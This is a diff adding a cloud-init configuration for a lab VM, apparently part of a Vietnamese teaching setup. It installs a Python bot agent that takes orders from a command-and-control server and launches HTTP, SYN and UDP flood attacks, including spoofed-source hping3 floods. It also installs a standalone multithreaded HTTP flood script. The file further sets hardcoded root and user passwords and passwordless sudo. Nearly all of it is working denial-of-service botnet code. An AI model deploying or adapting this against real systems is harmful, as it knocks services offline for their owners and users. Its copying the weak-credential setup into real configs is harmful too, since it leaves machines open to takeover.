@@ -1,0 +1,141 @@
+#cloud-config
+# VM2: ATT-Bot - Zombie/Bot Machine
+hostname: att-bot
+users:
+  - name: bot
+    sudo: ALL=(ALL) NOPASSWD:ALL
+    shell: /bin/bash
+    lock_passwd: false
+    plain_text_passwd: "Bot@123"
+
+chpasswd:
+  list: |
+    root:Bot@123
+    bot:Bot@123
+  expire: false
+
+ssh_pwauth: true
+
+write_files:
+  # Bot agent - kết nối C2 và thực hiện lệnh tấn công
+  - path: /opt/bot/bot_agent.py
+    permissions: '0755'
+    content: |
+      #!/usr/bin/env python3
+      """
+      ATT Lab - Bot Agent (mô phỏng học tập)
+      Kết nối tới C2 server và thực hiện lệnh tấn công
+      """
+      import socket, threading, subprocess, json, time, sys
+
+      C2_IP = sys.argv[1] if len(sys.argv) > 1 else "10.10.10.10"
+      C2_PORT = 9999
+
+      def run_attack(target_ip, target_port, duration, attack_type):
+          print(f"[BOT] Tấn công {target_ip}:{target_port} ({attack_type}) trong {duration}s")
+          if attack_type == "http":
+              subprocess.run([
+                  "python3", "/opt/bot/http_flood.py",
+                  "--target", f"http://{target_ip}:{target_port}",
+                  "--threads", "50",
+                  "--duration", str(duration)
+              ])
+          elif attack_type == "syn":
+              subprocess.run([
+                  "hping3", "-S", "--flood",
+                  "-p", str(target_port),
+                  "--rand-source",
+                  target_ip
+              ], timeout=duration)
+          elif attack_type == "udp":
+              subprocess.run([
+                  "hping3", "--udp", "--flood",
+                  "-p", str(target_port),
+                  target_ip
+              ], timeout=duration)
+
+      def connect_c2():
+          while True:
+              try:
+                  print(f"[BOT] Kết nối C2: {C2_IP}:{C2_PORT}...")
+                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                  sock.connect((C2_IP, C2_PORT))
+                  sock.send(f"BOT ONLINE: {socket.gethostname()}\n".encode())
+                  print(f"[BOT] Đã kết nối C2! Chờ lệnh...")
+
+                  buf = ""
+                  while True:
+                      data = sock.recv(4096).decode()
+                      if not data: break
+                      buf += data
+                      while "\n" in buf:
+                          line, buf = buf.split("\n", 1)
+                          try:
+                              cmd = json.loads(line.strip())
+                              if cmd.get("cmd") == "attack":
+                                  threading.Thread(
+                                      target=run_attack,
+                                      args=(cmd["target_ip"], cmd["target_port"],
+                                            cmd["duration"], cmd["type"]),
+                                      daemon=True
+                                  ).start()
+                          except: pass
+              except Exception as e:
+                  print(f"[BOT] Mất kết nối: {e}. Thử lại sau 10s...")
+                  time.sleep(10)
+
+      # HTTP Flood function (inline)
+      import requests
+      def http_flood_simple(target, threads_n, duration):
+          import threading
+          stop = threading.Event()
+          def worker():
+              s = requests.Session()
+              while not stop.is_set():
+                  try: s.get(target, timeout=2)
+                  except: pass
+          ts = [threading.Thread(target=worker) for _ in range(threads_n)]
+          [t.start() for t in ts]
+          time.sleep(duration)
+          stop.set()
+
+      connect_c2()
+
+  - path: /opt/bot/http_flood.py
+    permissions: '0755'
+    content: |
+      #!/usr/bin/env python3
+      import threading, requests, time, sys, argparse
+      parser = argparse.ArgumentParser()
+      parser.add_argument("--target", default="http://10.10.10.30")
+      parser.add_argument("--threads", type=int, default=50)
+      parser.add_argument("--duration", type=int, default=30)
+      args = parser.parse_args()
+      stop_event = threading.Event()
+      stats = {"sent": 0, "errors": 0}
+      lock = threading.Lock()
+      def flood():
+          session = requests.Session()
+          while not stop_event.is_set():
+              try:
+                  session.get(args.target, timeout=3)
+                  with lock: stats["sent"] += 1
+              except:
+                  with lock: stats["errors"] += 1
+      print(f"[BOT-FLOOD] {args.target} | {args.threads} threads | {args.duration}s")
+      threads = [threading.Thread(target=flood) for _ in range(args.threads)]
+      [t.start() for t in threads]
+      start = time.time()
+      while time.time() - start < args.duration:
+          elapsed = int(time.time() - start)
+          print(f"\r[{elapsed:3d}s] Sent:{stats['sent']:6d} Errors:{stats['errors']:4d}", end="", flush=True)
+          time.sleep(1)
+      stop_event.set()
+      print(f"\n[BOT] Done! {stats['sent']} requests")
+
+runcmd:
+  - apt-get update -y -q
+  - apt-get install -y hping3 curl wget python3 python3-pip python3-requests netcat-openbsd iputils-ping net-tools
+  - pip3 install requests --quiet
+  - chmod +x /opt/bot/*.py
+  - echo "Bot setup complete" > /var/log/att-setup.log
